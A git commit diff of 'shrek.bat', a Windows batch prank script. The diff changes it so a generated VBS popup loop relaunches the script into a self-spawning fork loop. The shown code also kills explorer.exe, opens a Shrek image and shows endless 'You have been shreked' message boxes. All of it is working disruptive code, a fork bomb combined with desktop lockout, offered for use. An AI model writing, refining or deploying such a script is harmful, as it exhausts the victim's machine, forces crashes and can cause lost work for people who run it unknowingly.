c68708e7b36b8429ff613d02d059c33d49a77b06
Neo Rafajlovic <97417002+NeoRafajlovic@users.noreply.github.com>
2026-04-11 17:59:37 -0400

    Update shrek.bat

--- shrek.bat
+++ shrek.bat
@@ -21,8 +21,11 @@ start "" /min powershell -command "(new-object -com shell.application).minimizea
 taskkill /F /im explorer.exe
 
 (
-echo Do
+echo Set objShell = WScript.CreateObject("WScript.Shell")
 echo MsgBox "You have been shreked :("
+echo objShell.run WScript.Arguments(0) & " fork"
+echo Do
+echo MsgBox "Oh no!"
 echo Loop
 ) > "%temp%\shrek_popup.vbs"
 
@@ -30,9 +33,9 @@ echo Loop
 start "" /max "https://i.pinimg.com/736x/75/6b/bb/756bbb4328e246e8608500ace5d9af0d.jpg"
 
 timeout /t 1 /nobreak >nul
-start %temp%\shrek_popup.vbs
+start %temp%\shrek_popup.vbs %~f0
 
-timeout /t 10 /nobreak >nul
+exit
 
 
 :fork
@@ -40,15 +43,5 @@ timeout /t 10 /nobreak >nul
 start "" /min "%~f0" min fork
 
 goto fork
-
-exit
-
-
-:vbs-loop
-
-start "" "%temp%\shrek_popup.vbs"
-timeout /t 1 /nobreak >nul
-
-goto vbs-loop
 
 exit
